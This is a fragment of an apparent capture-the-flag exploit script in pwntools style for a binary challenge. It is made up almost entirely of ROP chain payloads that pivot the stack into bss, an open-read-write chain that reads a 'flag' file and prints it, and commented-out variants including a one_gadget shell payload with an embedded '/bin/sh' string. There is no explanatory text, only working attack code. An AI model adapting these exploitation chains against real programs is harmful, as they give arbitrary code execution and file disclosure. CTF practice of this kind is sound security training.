...
constraints:
  ...
  '''
onegadget=0xe3b01
orw_rop=getpower(1,write_got,0x20,write_got)
orw_rop+=flat([pop_rbp,bss-0x200,p64(0x0000000000401304),leave_ret])
...
# orw_rop=flat([pop_rdi,bss-0x100+0xf0,open_plt,pop_rdi,4,pop_rsi_r15,bss+0x40,0,read_plt,pop_rdi,1,pop_rsi_r15,bss+0x40,0,write_plt])
rop=orw_rop
# rop=flat([pop_rdi,1,pop_rsi_r15,write_got,write_got,write_plt])
rop=rop.ljust(0xf0,b'k')
rop+=b'flag\x00/bin/sh\x00'
rop=rop.ljust(0x100,b'k')
payload2=rop+p64(bss-0x108)+p64(leave_ret)
pause()
gdba()
pause()
sd(payload2)
...
# payload3=flat([pop_rbp,bss+0x400,pop_rdx,0,pop_rsi_r15,0,0,onegadget,bss+0x200])
payload3=flat([pop_rdi,0,pop_rsi_r15,open_got,0,pop_rdx,8,read_plt,pop_rdi,bss-0x100+0xf0,pop_rsi_r15,0,0,open_plt,pop_rdi,3,pop_rsi_r15,bss+0x40,0,pop_rdx,0x20,read_plt,pop_rdi,1,pop_rsi_r15,bss+0x40,0,pop_rdx,0x20,write_plt])
payload3=payload3.ljust(0x100,b'g')
payload3+=p64(bss-0x308)+p64(leave_ret)
# payload3=b's'*0x100+p64(bss+0x200)+p64(leave_ret)
sd(payload3)
pause()
